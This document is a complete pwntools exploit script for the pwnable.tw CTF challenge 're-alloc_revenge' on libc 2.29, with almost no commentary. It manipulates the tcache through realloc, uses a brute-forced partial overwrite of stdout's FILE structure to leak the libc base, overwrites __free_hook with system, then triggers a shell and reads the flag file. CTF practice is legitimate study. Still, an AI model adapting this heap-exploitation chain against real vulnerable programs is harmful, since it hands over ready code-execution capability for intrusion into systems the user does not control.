#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./re-alloc_revenge"
ip = "chall.pwnable.tw"
port = 10310

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc-2.29.so"

context.log_level = 'info'

libc = ELF(remote_libc)


def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice: ", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add(io, idx, size, con):
    choice(io, 1)
    sla(io, "Index:", str(idx))
    sla(io, "Size:", str(size))
    sa(io, "Data:", con)

def readd(io, idx, size, con=''):
    choice(io, 2)
    sla(io, "Index:", str(idx))
    sla(io, "Size:", str(size))
    if con != '':
        sa(io, "Data:", con)

def remove(io, idx):
    choice(io, 3)
    sla(io, "Index:", str(idx))



while True:
    try:
        io = remote(ip, port)

        add(io, 0, 0x28, b'a')
        remove(io, 0)

        for i in range(6):
            add(io, 0, 0x18, b'a')
            readd(io, 0, 0x78, b'a')
            remove(io, 0)


        add(io, 0, 0x18, b'a')
        readd(io, 0, 0x78, b'a')
        add(io, 1, 0x18, b'a')
        readd(io, 1, 0x78, b'a')
        remove(io, 1)
        remove(io, 0)


        sla(io, "Your choice: ", b'1'*0x400)

        add(io, 0, 0x78, 'xd')
        readd(io, 0, 0, )
        readd(io, 0, 0x28, b'\x90')

        add(io, 1, 0x78, b'xd')

        readd(io, 1, 0x28, b'a'*8)
        remove(io ,1)
        add(io, 1, 0x58, b'\x00')
        readd(io, 1, 0x58, b'\x60\x57')

        readd(io, 0, 0x28, b'\x00'*0x10)
        remove(io, 0)
        add(io, 0, 0x78, b'a')
        readd(io, 0, 0x28, b'a')
        remove(io, 0)

        # mydebug(io, "")
        # input()

        add(io, 0, 0x78, p64(0xfbad1800)+ p64(0)*3)

        io.read(0x58)
        libc.address = base=u64(io.read(8))-(0x7ffff7fc1560-0x7ffff7ddb000)
        log.warning(hex(base))
        context.log_level='debug'

        readd(io, 1, 0x28, b'\x00'*0x10)
        remove(io, 1)

        add(io, 1, 0x68, b'a')
        readd(io, 1, 0, )
        readd(io, 1, 0x18, b'a')
        remove(io, 1)

        add(io, 1, 0x68, b'\x00'*0x18 + p64(0x71) + p64(libc.sym['__free_hook'] - 8))
        remove(io, 1)
        add(io, 1, 0x48, b'm'*8)
        remove(io, 1)

        add(io, 1, 0x48, b"/bin/sh\x00" + p64(libc.sym['system']))
        remove(io, 1)

        print("[!] OK!!!")
        sl(io, "cat /home/re-alloc_revenge/flag")
        input()
        io.interactive()

        break
    except:
        print("[!] No...")
        io.close()
